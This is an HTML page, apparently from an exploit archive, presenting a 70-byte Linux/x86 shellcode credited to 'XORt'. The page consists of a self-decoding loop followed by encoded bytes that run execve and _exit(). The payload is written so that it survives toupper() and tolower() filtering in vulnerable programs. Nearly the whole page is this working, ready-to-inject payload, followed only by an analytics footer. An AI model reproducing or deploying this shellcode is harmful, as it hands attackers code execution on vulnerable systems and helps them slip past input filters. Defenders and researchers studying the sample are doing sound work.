<html><head><title>Linux/x86 - Radically Self Modifying Code - execve &amp; _exit() - 70 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*-------------------------------------------------------*/
/*     Radically Self Modifying Code for surviving       */
/*            toupper() and tolower()                    */
/*                                                       */
/*         70byte execve &amp; _exit() code by XORt          */
/*-------------------------------------------------------*/
&quot;\xeb\x12&quot;                 /* jmp $0x12                  */
&quot;\x5e&quot;                     /* pop %esi                   */
/*-set-up-loop-counter-and-ajust-shellcode-pointer-------*/
&quot;\x31\xc9&quot;                 /* xor %ecx, %ecx             */
&quot;\xb1\x0b&quot;                 /* mov $0xb, %cl              */
&quot;\xff\xc6&quot;                 /* inc %esi                   */
/*-the-loop----------------------------------------------*/
&quot;\x81\x06\x5b\x2d\xd0\xcb&quot; /* addl $0xcbd02d5b, (%esi)   */
&quot;\xad&quot;                     /* lodsl                      */
&quot;\xe2\xf7&quot;                 /* loop -$0x9                 */
/*--jump-into-shellcode----------------------------------*/
&quot;\xeb\x05&quot;                 /* jmp $0x5                   */
&quot;\xe8\xe9\xff\xff\xff&quot;     /* call -$0x17                */
/*--------------------------------------------[bytes:25]-*/
//                                                       //
/*--the-shellcode----------------------------------------*/
&quot;\xeb&quot;                     /* --then encoded shellcode-- */
&quot;\xc4\x30\xb9\xaa&quot;         /*                            */
&quot;\xad\x03\xf0\xbc&quot;         /*                            */
&quot;\xeb\xd9\xb8\x7a&quot;         /*                            */
&quot;\xb1\x82\x3b\xbd&quot;         /*                            */
&quot;\x98\x60\x7e\x3c&quot;         /*                            */
&quot;\x32\x29\x3c\x01&quot;         /*                            */
&quot;\x25\x04\x0b\xbe&quot;         /*                            */
&quot;\x7d\x13\xfd\xb4&quot;         /*                            */
&quot;\x8d\xaf\x2f\x34&quot;         /*                            */
&quot;\xa4\x02\x92\x9d&quot;         /*                            */
&quot;\x13\x02\xa3\x9c&quot;;        /*                            */
/*--------------------------------------------[bytes:45]-*/



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
